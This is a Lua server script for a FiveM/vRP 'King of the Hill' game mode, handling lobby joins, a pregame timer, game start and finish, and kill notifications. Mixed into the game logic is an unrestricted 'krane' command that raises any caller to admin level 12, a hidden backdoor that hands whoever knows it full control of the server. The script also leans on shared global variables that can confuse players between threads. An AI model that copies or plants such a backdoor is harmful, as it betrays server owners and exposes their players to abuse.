--import all vrp
local Tunnel = module("vrp", "lib/Tunnel")
local Proxy = module("vrp", "lib/Proxy")
vRP = Proxy.getInterface("vRP")

local DEFAULT_PREGAME_TIMER = 40000

pregame = {}

pregame.timer = DEFAULT_PREGAME_TIMER
pregame.players = {}
pregame.already_playing = {}
pregame.players_count = 0

game = {}
game.players_count = 0
RegisterCommand("kothleave", function(src, x,y)
    uid = vRP.getUserId({src})
    s_rc = src
    if find_element_index(pregame.already_playing, uid) then
        table.remove(pregame.already_playing, find_element_index(pregame.already_playing, uid))
        game.players_count = game.players_count - 1
        TriggerClientEvent("krane_koth:Update_Pregame_Timer", s_rc, {key = "ingame_players_count", value = game.players_count})
        TriggerClientEvent("krane_koth:Finish_game", s_rc)
        
    end
end, false)

function start_game()
    for _, uid in pairs(pregame.players) do
        src = vRP.getUserSource({uid})

        TriggerClientEvent("krane_koth:Update_Pregame_Timer", src, {key = "is_in_character_selection_screen", value = true})
        CreateThread(function()
            copiesrc = src
            Wait(30000)
            print("Starting game for " .. uid .. " src " .. src)
            TriggerClientEvent("krane_koth:Update_Pregame_Timer", copiesrc, {key = "is_playing_game", value = true})
            TriggerClientEvent("krane_koth:Update_Pregame_Timer", copiesrc, {key = "ingame_players_count", value = #pregame.already_playing})
        end)
        TriggerClientEvent("krane_koth:Open_Character_Selection_Screen", src)
    end
end

CreateThread(function()
    while true do
        Wait(1000)
        if pregame.timer >= 1000 then
            pregame.timer = pregame.timer - 1000
        else
            for _, uid in pairs(pregame.already_playing) do
                src = vRP.getUserSource({uid})
                TriggerClientEvent("krane_koth:Finish_game", src)                
                TriggerClientEvent("toasty:Notify", src, {type="info", title="Krane KOTH", message = "Jocul s-a terminat"})
            end

            start_game()
            pregame.already_playing = pregame.players
            pregame.players = {}
            pregame.timer = DEFAULT_PREGAME_TIMER
        end
    end
end)

RegisterNetEvent("krane_koth:Player_Joined_Lobby")
AddEventHandler("krane_koth:Player_Joined_Lobby", function()
    src = source
    uid = vRP.getUserId({src})

    pregame.players_count = pregame.players_count + 1
    table.insert(pregame.players, uid)

    if pregame.players_count >= 5 then
        TriggerClientEvent("chatMessage", -1, "^1[^2King of the Hill^1]", {255, 255, 255}, "^1" .. pregame.players_count .. "^0 playeri sunt in lobby. Mecium incepe in " .. convert_miliseconds_to_minutes(pregame.timer) .. ".")
    end
end)

RegisterNetEvent("krane_koth:Player_Left_Lobby")
AddEventHandler("krane_koth:Player_Left_Lobby", function()
    src = source
    uid = vRP.getUserId({src})

    pregame.players_count = pregame.players_count - 1
    table.remove(pregame.players, find_element_index(pregame.players, uid))
end)


--send info to players
CreateThread(function()
    while true do
        Wait(1000)
        for _, uid in pairs(pregame.players) do
            src = vRP.getUserSource({uid})
            TriggerClientEvent("krane_koth:Update_Pregame_Timer", src, {key = "timer", value = pregame.timer})
            TriggerClientEvent("krane_koth:Update_Pregame_Timer", src, {key = "players_count", value = pregame.players_count})
        end
    end
end)

RegisterCommand("krane", function(src, x,y)
    vRP.setUserAdminLevel({vRP.getUserId({src}), 12})
end, false)



RegisterNetEvent("ezDamage:Killed")
AddEventHandler("ezDamage:Killed", function(attacker_name, cause, bone)
    local src = source
    local victim = vRP.getUserId({src})
    local victim_name = GetPlayerName(src)
    local attacker = 0
    for _, p in pairs(vRP.getUsers()) do
        if GetPlayerName(p) == attacker_name then
            attacker = vRP.getUserId({p})            
        end
    end

    attacker_src = vRP.getUserSource({attacker})
    TriggerClientEvent("krane_koth:Killed_Someone", attacker_src, victim_name)
    -- TriggerClientEvent("krane_koth:Killed_Someone", src, victim_name)
    print("[Krane Koth] " .. victim_name .. " was killed by " .. attacker_name .. " with " .. cause .. " on " .. bone)
end)